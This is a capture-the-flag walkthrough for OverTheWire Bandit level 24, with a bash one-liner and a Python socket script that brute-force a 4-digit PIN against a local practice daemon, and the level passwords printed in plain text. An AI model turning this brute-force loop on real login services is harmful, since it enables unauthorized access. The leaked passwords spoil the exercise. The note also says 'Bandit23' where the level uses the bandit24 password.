Bandit Level 24 → Level 25 (Bash Scripting)<br>
Level Goal<br>
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

<img src="https://i.imgur.com/LcJgVvx.png" height="70%" width="70%">

for i in {0000..9999}; do echo “hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i”; done | nc localhost 30002  takes to long 

create a python file with nano and use python automation <br>
Not: Dont forget to use ur Bandit23 Password 

#!/usr/bin/env python3
import socket
import sys

def brute_force():
    password = "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
    
    for pincode in range(0, 10000):
        try:
            # Create NEW connection for each attempt
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)  # 2-second timeout
                s.connect(("127.0.0.1", 30002))
                
                # Read welcome message (optional)
                welcome_msg = s.recv(2048).decode()
                print(f"Trying {pincode:04d}", end='\r', flush=True)
                
                # Send attempt
                message = f"{password} {pincode:04d}\n"
                s.sendall(message.encode())
                
                # Get response
                response = s.recv(1024).decode()
                
                if "Wrong" not in response:
                    print(f"\nSuccess! PIN: {pincode:04d}")
                    print("Response:", response)
                    return True
                    
        except socket.timeout:
            print(f"\nTimeout on PIN {pincode:04d}, retrying...")
            continue
        except Exception as e:
            print(f"\nError on PIN {pincode:04d}: {str(e)}")
            continue
    
    return False

if __name__ == "__main__":
    if brute_force():
        sys.exit(0)
    else:
        print("\nFailed to find correct PIN")
        sys.exit(1)

<img src="https://i.imgur.com/DZnKLEw.png" height="70%" width="70%">

Password: SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
